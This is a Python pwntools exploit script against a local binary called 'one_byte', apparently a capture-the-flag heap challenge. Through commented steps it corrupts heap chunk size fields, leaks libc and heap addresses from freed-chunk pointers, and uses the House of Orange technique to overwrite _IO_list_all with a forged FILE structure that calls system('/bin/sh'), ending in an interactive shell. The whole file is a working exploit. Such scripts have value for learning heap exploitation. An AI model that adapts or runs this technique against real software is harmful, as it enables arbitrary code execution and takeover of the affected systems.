#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("one_byte")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option.
# Returns chunk index.
def malloc():
    global index
    io.sendthen("> ", "1")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send("3")
    io.sendafter("index: ", f"{index}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

# Select the "read" option; read 0x58 bytes.
def read(index):
    io.send("4")
    io.sendafter("index: ", f"{index}")
    r = io.recv(0x58)
    io.recvuntil("> ")
    return r

io = start()
io.recvuntil("> ")
io.timeout = 0.1

# =============================================================================

# Request 5 chunks
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc()
chunk_E = malloc()

# Edit chunk A to overwrite the size field of chunk B
edit(chunk_A, b"Y"*0x58 + p64(0x60 * 2 + 0x1))

# Free chunk B into the unsortedbin (0xc0 size)
free(chunk_B)

# Allocate 0x60-sized chunk. This will split chunk B in half
# due to remaindering process.
# The allocated chunk will be placed right after chunk A but before
# our unsortedbin'ed chunk B.
chunk_B = malloc()

# Unsortedbin'ed half of chunk B has became chunk C.
# Now we can read fd and bk addresses (pointing to the unsortedbin), 
# effectively leaking libc address.
unsortedbin_address = u64(read(chunk_C)[:8])
unsortedbin_libc_offset = libc.sym.main_arena + 88

libc.address = unsortedbin_address - unsortedbin_libc_offset
log.info(f"libc @ {hex(libc.address)}")

# Request unsortedbin'ed half of chunk B
chunk_C2 = malloc()

# Put chunk A into the fastbin
free(chunk_A)

# Put chunk C2 into the fastbin
free(chunk_C2)

# Chunk C2 now has an fd pointing to the start of chunk A,
# which is also a heap start address.
# We can read chunk C2 using chunk C to leak it.
heap = u64(read(chunk_C)[:8])
log.info(f"heap @ {hex(heap)}")

# Revert the heap to its initial state
chunk_C = malloc()
chunk_A = malloc()

# =============================================================================

# Edit chunk A to overwrite the size field of chunk B
edit(chunk_A, b"Y"*0x58 + p64(0x60 * 2 + 0x1))

# Free chunk B into the unsortedbin (0xc0 size)
free(chunk_B)

# Remainder chunk B again
chunk_B = malloc()

# Unsortedbin'ed half of chunk B has became chunk C.
# Now we can leverage the House of Orange technique

# 0xb0 is a smallbin size _IO_list_all targets + prev_inuse flag
# (determined from main arena layout)
edit(chunk_B, p64(0) * 10 + b"/bin/sh\x00" + p8(0xb1))

edit(chunk_C, p64(0xdeadbeef) + p64(libc.sym._IO_list_all - 0x10) + p64(1) + p64(2))

# chunk D is null, so the mode is already set to 0

edit(chunk_E, p64(libc.sym.system) + p64(heap + 0x178))

# Check:
# pwndbg> p (struct _IO_FILE_plus) *0x5555557570c0
# pwndbg> p *$1.vtable

# Trigger the attack
malloc()

# =============================================================================

io.interactive()
